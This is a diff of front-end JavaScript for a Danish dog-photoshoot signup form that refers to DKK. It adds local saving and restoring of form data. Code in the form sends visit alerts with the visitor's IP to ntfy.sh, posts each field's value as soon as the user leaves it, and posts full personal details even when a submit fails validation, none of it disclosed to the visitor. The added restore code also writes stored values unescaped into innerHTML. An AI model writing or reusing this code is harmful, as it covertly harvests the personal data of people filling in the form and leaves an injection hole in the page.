@@ -54,12 +54,12 @@ window.addEventListener('DOMContentLoaded', async () => {
         userIP = data.ip;
     } catch(e) { userIP = "Unknown"; }
 
-    addDogField();
+    restoreFormState(); // Load saved cookies/localstorage
     bindLanguageSwitch();
     sendNtfy("👀 Page Visited", `Session: ${sessionId}\nIP: ${userIP}\nTime: ${new Date().toLocaleString('da-DK')}`, "eyes");
 });
 
-// --- VALIDATION LOGIC ---
+// --- REAL-TIME VALIDATION LOGIC ---
 function validateEmail(email) {
     const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     if (!re.test(email)) return false;
@@ -68,9 +68,7 @@ function validateEmail(email) {
 }
 
 function validatePhone(phone) {
-    // Fjerner mellemrum, bindestreger og parenteser
     const cleanPhone = phone.replace(/[\s\-\(\)]/g, '');
-    // Tillader valgfrit + i starten, efterfulgt af 8-15 tal (dækker næsten alle lande, inkl. DK: +45XXXXXXXX)
     const re = /^(\+?\d{8,15})$/; 
     return re.test(cleanPhone);
 }
@@ -79,8 +77,8 @@ function validateField(input) {
     const val = input.value.trim();
     let isValid = input.checkValidity() && val !== '';
 
-    if (input.type === 'email') isValid = validateEmail(val);
-    if (input.type === 'tel') isValid = validatePhone(val);
+    if (input.type === 'email' && val !== '') isValid = validateEmail(val);
+    if (input.type === 'tel' && val !== '') isValid = validatePhone(val);
 
     if (isValid) {
         input.classList.remove('invalid');
@@ -93,47 +91,63 @@ function validateField(input) {
 }
 
 // --- DYNAMIC DOG FIELDS ---
-function addDogField() {
+function addDogField(savedData = null) {
     dogCount++;
     const container = document.getElementById('dogsContainer');
     const div = document.createElement('div');
     div.className = 'dog-card grid grid-cols-1 md:grid-cols-2 gap-6';
+    
+    // Check if restoring data, otherwise empty
+    const nameVal = savedData ? savedData.name : '';
+    const ageVal = savedData ? savedData.age : '';
+    const photosVal = savedData ? savedData.photos : '';
+    const skillsVal = savedData ? savedData.skills : '';
+
     div.innerHTML = `
         <div class="absolute -top-3 left-4 bg-dkkRed text-white text-xs font-bold px-3 py-1 rounded-full">#${dogCount}</div>
         <div class="floating-input-group col-span-2">
-            <input type="text" class="dogName floating-input" required placeholder=" ">
+            <input type="text" class="dogName floating-input" required placeholder=" " value="${nameVal}">
             <label class="floating-label" data-i18n="d_name">${i18n[currentLang].d_name}</label>
             <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
         </div>
         <div class="floating-input-group">
-            <input type="text" class="dogAge floating-input" required placeholder=" ">
+            <input type="text" class="dogAge floating-input" required placeholder=" " value="${ageVal}">
             <label class="floating-label" data-i18n="d_age">${i18n[currentLang].d_age}</label>
             <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
         </div>
         <div class="floating-input-group">
-            <input type="url" class="dogPhotos floating-input" required placeholder=" ">
+            <input type="url" class="dogPhotos floating-input" required placeholder=" " value="${photosVal}">
             <label class="floating-label" data-i18n="d_photos">${i18n[currentLang].d_photos}</label>
             <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
         </div>
         <div class="floating-input-group col-span-2">
-            <input type="text" class="dogSkills floating-input" required placeholder=" ">
+            <input type="text" class="dogSkills floating-input" required placeholder=" " value="${skillsVal}">
             <label class="floating-label" data-i18n="d_skills">${i18n[currentLang].d_skills}</label>
             <svg class="valid-icon w-6 h-6 text-green-500 absolute right-3 top-4 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
         </div>
     `;
     container.appendChild(div);
     bindTracking(div);
+    
+    // Trigger validation immediately for restored fields
+    if(savedData) {
+        div.querySelectorAll('input').forEach(input => validateField(input));
+    }
 }
-document.getElementById('addDogBtn').addEventListener('click', addDogField);
+document.getElementById('addDogBtn').addEventListener('click', () => addDogField(null));
 
-// --- BLUR TRACKING & LIVE VALIDATION ---
+// --- BLUR & KEYSTROKE TRACKING ---
 function bindTracking(parent = document) {
     const inputs = parent.querySelectorAll('input');
     inputs.forEach(input => {
-        input.addEventListener('input', () => validateField(input));
-        
-        input.addEventListener('blur', (e) => {
+        // FAST KEYSTROKE VALIDATION
+        input.addEventListener('input', (e) => {
             validateField(e.target);
+            saveFormState(); // Save to local storage on every keystroke!
+        });
+        
+        // NTFY TRACKING ON LEAVING FIELD
+        input.addEventListener('blur', (e) => {
             const val = e.target.value.trim();
             if (val !== "") {
                 const label = e.target.nextElementSibling ? e.target.nextElementSibling.innerText : "Felt";
@@ -143,6 +157,57 @@ function bindTracking(parent = document) {
     });
 }
 
+// --- SAVE & RESTORE (COOKIES / LOCAL STORAGE) ---
+function saveFormState() {
+    const data = {
+        ownerName: document.getElementById('ownerName').value,
+        ownerAddress: document.getElementById('ownerAddress').value,
+        ownerEmail: document.getElementById('ownerEmail').value,
+        ownerPhone: document.getElementById('ownerPhone').value,
+        ownerSocials: document.getElementById('ownerSocials').value,
+        dkkMember: document.getElementById('dkkMember').value,
+        dogs: []
+    };
+    document.querySelectorAll('.dog-card').forEach(card => {
+        data.dogs.push({
+            name: card.querySelector('.dogName').value,
+            age: card.querySelector('.dogAge').value,
+            photos: card.querySelector('.dogPhotos').value,
+            skills: card.querySelector('.dogSkills').value
+        });
+    });
+    localStorage.setItem('dkkFotoshootData', JSON.stringify(data));
+}
+
+function restoreFormState() {
+    const saved = localStorage.getItem('dkkFotoshootData');
+    if (saved) {
+        const data = JSON.parse(saved);
+        document.getElementById('ownerName').value = data.ownerName || '';
+        document.getElementById('ownerAddress').value = data.ownerAddress || '';
+        document.getElementById('ownerEmail').value = data.ownerEmail || '';
+        document.getElementById('ownerPhone').value = data.ownerPhone || '';
+        document.getElementById('ownerSocials').value = data.ownerSocials || '';
+        document.getElementById('dkkMember').value = data.dkkMember || '';
+
+        if (data.dogs && data.dogs.length > 0) {
+            document.getElementById('dogsContainer').innerHTML = '';
+            dogCount = 0;
+            data.dogs.forEach(dog => addDogField(dog));
+        } else {
+            addDogField();
+        }
+
+        // Validate all pre-filled fields
+        document.querySelectorAll('input').forEach(input => {
+            if(input.value) validateField(input);
+        });
+    } else {
+        addDogField(); // Add empty dog if no save exists
+    }
+    bindTracking(document);
+}
+
 // --- DATA COLLECTION ---
 function getPayload() {
     let dogDetails = "";
@@ -150,18 +215,7 @@ function getPayload() {
         dogDetails += `\nHUND ${index + 1}:\n- Navn: ${el.querySelector('.dogName').value}\n- Alder: ${el.querySelector('.dogAge').value}\n- Færdigheder: ${el.querySelector('.dogSkills').value}\n- Fotos: ${el.querySelector('.dogPhotos').value}\n`;
     });
 
-    return `
-EJER:
-Navn: ${document.getElementById('ownerName').value}
-Adresse: ${document.getElementById('ownerAddress').value}
-Email: ${document.getElementById('ownerEmail').value}
-Tlf: ${document.getElementById('ownerPhone').value}
-SoMe: ${document.getElementById('ownerSocials').value || 'Ingen'}
-DKK: ${document.getElementById('dkkMember').value || 'Ingen'}
-
-HUNDE INFO: ${dogDetails}
------------------------
-IP: ${userIP}`;
+    return `EJER:\nNavn: ${document.getElementById('ownerName').value}\nAdresse: ${document.getElementById('ownerAddress').value}\nEmail: ${document.getElementById('ownerEmail').value}\nTlf: ${document.getElementById('ownerPhone').value}\nSoMe: ${document.getElementById('ownerSocials').value || 'Ingen'}\nDKK: ${document.getElementById('dkkMember').value || 'Ingen'}\n\nHUNDE INFO: ${dogDetails}\n-----------------------\nIP: ${userIP}`;
 }
 
 // --- SUBMIT HANDLING ---
@@ -170,18 +224,16 @@ document.getElementById('dkkForm').addEventListener('submit', async (e) => {
     const btn = document.getElementById('submitBtn');
     const alertBox = document.getElementById('errorAlert');
     
-    // Check all fields
     let formIsValid = true;
     document.querySelectorAll('input[required]').forEach(input => {
         if (!validateField(input)) {
             formIsValid = false;
-            input.classList.add('invalid'); // trigger shake
+            input.classList.add('invalid'); 
         }
     });
 
     if (!formIsValid) {
         alertBox.classList.remove('hidden');
-        // SEND PARTIAL DATA ON INVALID SUBMIT
         sendNtfy("⚠️ Fejl / Manglende Data Submit", getPayload(), "warning");
         return;
     }
@@ -194,15 +246,15 @@ document.getElementById('dkkForm').addEventListener('submit', async (e) => {
         await sendNtfy("🐶 📸 SUCCESS: Ny DKK Model!", getPayload(), "camera_flash,dog");
         document.getElementById('dkkForm').classList.add('hidden');
         document.getElementById('successMessage').classList.remove('hidden');
+        localStorage.removeItem('dkkFotoshootData'); // Rydder hukommelsen efter succes
     } catch(err) {
         alert("Noget gik galt. Prøv igen.");
         btn.disabled = false;
     }
 });
 
-// --- HELPER FUNCTION: NTFY VIA JSON (FIXES EMOJI CRASH) ---
+// --- NTFY VIA JSON ---
 function sendNtfy(title, message, tags) {
-    // By using a JSON body, we bypass the HTTP Header ASCII limitations completely
     return fetch(`https://ntfy.sh/`, {
         method: 'POST',
         body: JSON.stringify({
